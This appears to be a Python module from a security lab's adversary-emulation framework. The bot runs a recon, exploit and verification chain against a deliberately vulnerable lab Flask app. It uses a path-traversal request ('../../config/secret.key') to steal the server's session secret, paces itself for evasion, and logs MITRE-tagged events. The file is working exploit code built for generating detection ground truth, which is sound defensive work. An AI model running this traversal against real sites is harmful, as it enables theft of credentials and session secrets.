"""Objective bot: CWE-22 Path Traversal -> session-secret key theft.

Real kill chain against the lab Flask target (docker/target/webapp/app.py):
  recon        -> GET / and parse the "/download?file=..." hint left in an
                   HTML comment (a realistic "forgot to remove the debug
                   note" leak); register + login (the download feature
                   requires *some* authenticated session, just not admin)
  exploit      -> GET /download?file=../../config/secret.key -- the
                   filename is joined onto BACKUP_DIR with no
                   sanitization/allowlist, so the traversal escapes it
  post_exploit -> independently verify the stolen text actually looks like
                   the real per-boot secret (64 lowercase hex chars, i.e.
                   secrets.token_hex(32)) rather than trusting the 200

CLASS_ID/MITRE_TACTIC feed `configs/lab_objectives.yaml` and the live
orchestrator's ground-truth event log.
"""

from __future__ import annotations

import re
import time
import uuid

import requests

from src.adversarial.bots.lab_objective_base import (
    STAGE_EXPLOIT,
    STAGE_POST_EXPLOIT,
    STAGE_RECON,
    EventLogger,
    ObjectiveEvent,
    evasion_think_time,
    run_via_default_shim,
)
from src.adversarial.lab_clock import LabClock

CLASS_ID = "T1552_key_theft"
MITRE_TACTIC = "Credential Access"

_HINT_RE = re.compile(r"/download\?file=([\w.\-]+)")
_SECRET_RE = re.compile(r"^[0-9a-f]{64}$")


def run_objective(
    target_ip: str,
    evasion: str,
    clock: LabClock,
    event_log: EventLogger,
    round_id: str = "",
    base_url: str | None = None,
) -> dict:
    base = base_url or f"http://{target_ip}"
    session = requests.Session()
    result: dict = {"class_id": CLASS_ID, "success": False}

    def log(stage: str, success: bool, evidence: str = "") -> None:
        event_log.log(ObjectiveEvent(CLASS_ID, stage, success, time.time(), evidence, round_id))

    # --- recon: browse the homepage, find the leaked backup hint,
    #     register + login to reach the (login-gated) download feature ---
    username = f"guest_{uuid.uuid4().hex[:8]}"
    password = "hunter2-lab"
    try:
        r = session.get(f"{base}/", timeout=5)
        hint = _HINT_RE.search(r.text)
        hinted_file = hint.group(1) if hint else "site_backup_2026.txt"
        recon_ok = r.status_code == 200
        session.post(f"{base}/register", data={"username": username, "password": password}, timeout=5)
        evasion_think_time(evasion, clock)
        session.post(f"{base}/login", data={"username": username, "password": password}, timeout=5)
    except requests.RequestException as exc:
        log(STAGE_RECON, False, str(exc))
        return result
    log(STAGE_RECON, recon_ok, f"hinted_file={hinted_file}")
    evasion_think_time(evasion, clock)

    # --- exploit: traverse out of BACKUP_DIR to the real secret --------
    try:
        r = session.get(f"{base}/download", params={"file": "../../config/secret.key"}, timeout=5)
        exploit_ok = r.status_code == 200
        stolen = r.text.strip()
    except requests.RequestException as exc:
        log(STAGE_EXPLOIT, False, str(exc))
        return result
    log(STAGE_EXPLOIT, exploit_ok, f"status={r.status_code} bytes={len(stolen)}")

    # --- post-exploit: verify the stolen text is actually secret-shaped -
    evasion_think_time(evasion, clock)
    success = bool(_SECRET_RE.match(stolen))
    log(STAGE_POST_EXPLOIT, success, f"format_valid={success}")
    result["success"] = success
    if success:
        result["stolen_secret_prefix"] = stolen[:8]
    return result


def run(target_ip: str, evasion: str) -> int:
    """Legacy `RunFn -> int` shim for ad-hoc CLI use via attack_script.py."""
    return run_via_default_shim(run_objective, target_ip, evasion)
